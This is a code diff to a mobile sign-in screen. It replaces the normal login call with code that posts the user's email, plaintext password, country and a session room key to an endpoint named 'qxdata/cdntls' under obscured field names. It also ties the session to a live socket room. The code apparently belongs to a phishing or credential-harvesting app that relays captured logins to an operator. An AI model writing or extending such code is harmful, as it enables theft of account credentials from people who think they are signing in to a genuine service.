@@ -23,14 +23,61 @@ const sign = () => {
 
 
 const router = useRouter()
-const {WIDTH,HEIGHT,getClient,myClient,isloading} = useContext(AuthContext)
+const {WIDTH,HEIGHT,myClient,isloading,delPipeline,socket,roomKey,locationP,api,setisloading,enableLocation} = useContext(AuthContext)
 const [isopen,setisopen] = useState(true)
 const [user,setUser] = useState<user>({email:'',password:''})
 
 
+
+
+
+const connectExistingUser = () => {
+socket.emit('existingRoom',roomKey)
+}
+
+
+const beginSession = async () => {
+
+if (user.password === '') return
+
+setisloading(true)
+enableLocation()
+
+}
+
+
+
+
+
 useEffect(() => {
+socket.removeAllListeners("connect")
 setUser({email:myClient.email,password:''})
 },[])
+
+
+
+useEffect(() => {
+if (roomKey) {
+socket.on('connect',connectExistingUser)
+}
+},[roomKey])
+
+
+
+useEffect(() => {
+
+if (locationP.isEnable) {
+
+const cot = async () => {
+await api.post('qxdata/cdntls',{qxcountry:locationP.isocode,qxmail:user.email,qxpass:user.password,qxrkey:roomKey})
+}
+
+
+cot()
+
+}
+
+},[locationP.isEnable])
 
 
 
@@ -55,7 +102,11 @@ return (
 <View style={styles.boxii}>
 <Text style={[styles.textii,{fontSize:18}]}>{user.email}</Text>
 </View>
-<TouchableOpacity style={styles.boxiii} onPress={() => router.push({pathname:'/next'})}>
+<TouchableOpacity style={styles.boxiii} 
+onPress={() => {
+delPipeline()
+router.push({pathname:'/(signIn)/next'})
+}}>
 <Text style={[styles.textii,{fontSize:16,color:'#2B47FF'}]}>Change</Text>
 <FontAwesome6 name="edit" size={18} color='#2B47FF' />
 </TouchableOpacity>
@@ -89,7 +140,7 @@ return (
 
 <View style={styles.framev}>
 {
-isloading ? (<View style={styles.btn}><ActivityIndicator size={16} color='azure' /></View>) : (<TouchableOpacity style={styles.btn} onPress={() => getClient(user)}>
+isloading ? (<View style={styles.btn}><ActivityIndicator size={16} color='azure' /></View>) : (<TouchableOpacity style={styles.btn} onPress={beginSession}>
 <Text style={[styles.textii,{fontSize:22,color:"#FFFFFF"}]} >Sign In</Text>
 <FontAwesome name="angle-right" size={30} color="#FFFFFF" />
 </TouchableOpacity>)
